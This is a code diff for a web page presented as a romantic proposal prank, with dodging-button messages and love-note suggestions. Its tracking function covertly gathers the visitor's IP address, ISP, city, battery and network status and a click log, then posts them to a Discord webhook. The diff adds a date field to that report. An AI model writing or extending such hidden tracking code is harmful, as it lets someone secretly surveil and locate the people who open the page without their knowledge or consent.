@@ -87,7 +87,7 @@
 <script>
   let visitorName = "", clickCount = 0, yesScale = 1, lastMsgId = null, actionHistory = [];
   let batteryLevel = "Unknown", connectionType = "Unknown";
-  const WEBHOOK_URL = "YOUR_WEBHOOK_URL";
+  const WEBHOOK_URL = "YOUR_WEBHOOK_URL"; 
 
   const phase1 = ["Try again!", "Close!", "Nope!"];
   const phase2 = ["Seriously?", "Stop it.", "Wasting time."];
@@ -127,7 +127,9 @@
   }
 
   async function trackEvent(status) {
-    const time = new Date().toLocaleTimeString();
+    const now = new Date();
+    const time = now.toLocaleTimeString();
+    const fullDate = now.toLocaleDateString(); // Added to fix date issue
     actionHistory.push(`[${time}] ${status}`);
     
     let spyData = {};
@@ -142,13 +144,14 @@
         color: status.includes("YES") ? 0x00ff00 : 0xff4d6d,
         fields: [
           { name: "Current Status", value: `**${status}**`, inline: true },
+          { name: "Session Date", value: `**${fullDate}**`, inline: true }, // Explicit Date Field
           { name: "Battery / Net", value: `${batteryLevel} / ${connectionType}`, inline: true },
           { name: "Misses", value: `${clickCount}`, inline: true },
           { name: "Location", value: `${spyData.city || "Unknown"}`, inline: true },
           { name: "Activity Log", value: `\`\`\`${actionHistory.slice(-20).join("\n")}\`\`\``, inline: false },
           { name: "Network Data", value: `IP: \`${spyData.ip}\`\nISP: \`${spyData.org}\``, inline: false }
         ],
-        timestamp: new Date().toISOString()
+        timestamp: now.toISOString() // This ensures Discord uses ITS OWN internal clock for the footer time
       }]
     };
 
@@ -208,9 +211,9 @@
   function updateSuggestions() {
     const to = document.getElementById('targetInput').value.trim() || "You";
     const deepMessages = [
-      `${to}, you are the piece of my soul I never knew was missing. [cite: -]`,
-      `Every beat of my heart belongs to you, ${to}. [cite: -]`,
-      `In a world of temporary things, ${to}, you are my forever. [cite: -]`
+      `${to}, you are the piece of my soul I never knew was missing.`,
+      `Every beat of my heart belongs to you, ${to}.`,
+      `In a world of temporary things, ${to}, you are my forever.`
     ];
     const select = document.getElementById('suggestionBox');
     select.innerHTML = '<option value="">✨ Romantic Suggestions...</option>' + 
